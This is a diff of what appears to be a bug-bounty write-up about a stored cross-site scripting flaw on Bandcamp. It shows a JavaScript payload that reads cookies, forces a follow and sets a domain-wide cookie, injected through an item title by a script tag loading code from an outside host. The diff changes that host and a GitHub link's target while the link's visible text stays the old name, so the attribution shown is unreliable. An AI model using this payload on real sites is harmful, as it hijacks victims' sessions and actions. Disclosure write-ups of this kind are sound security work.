@@ -22,7 +22,7 @@ alert("Your cookies: " + document.cookie);
 document.getElementById("follow-unfollow").click();alert("Thanks for the follow :^D");
 document.cookie="hacker=cdl;path=/;domain=.bandcamp.com";  
 ```
-Then changed the **Item Title** to `<script src=//sxcurity.pro/bandcamp.js></script>`
+Then changed the **Item Title** to `<script src=//C0RB3N.pro/bandcamp.js></script>`
 which made the victim follow me and set the cookie "hacker" to "cdl" for bandcamp.com and all subdomains in their browser!
 <br>Proof of concept video:
 <iframe src="https://player.vimeo.com/video/224109910" width="640" height="360" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>
@@ -37,5 +37,5 @@ Thanks for reading,<br><br>
 - <a class="link" href="https://twitter.com/hacker_"  target="_blank" rel="noopener noreferrer">https://twitter.com/hacker_</a>
 - <a class="link" href="https://hackerone.com/cdl" target="_blank" rel="noopener noreferrer">https://hackerone.com/cdl</a>
 - <a class="link" href="https://bugcrowd.com/c" target="_blank" rel="noopener noreferrer">https://bugcrowd.com/c</a>
-- <a class="link" href="https://github.com/sxcurity"  target="_blank" rel="noopener noreferrer">https://github.com/sxcurity</a>
+- <a class="link" href="https://github.com/C0RB3N"  target="_blank" rel="noopener noreferrer">https://github.com/sxcurity</a>
 
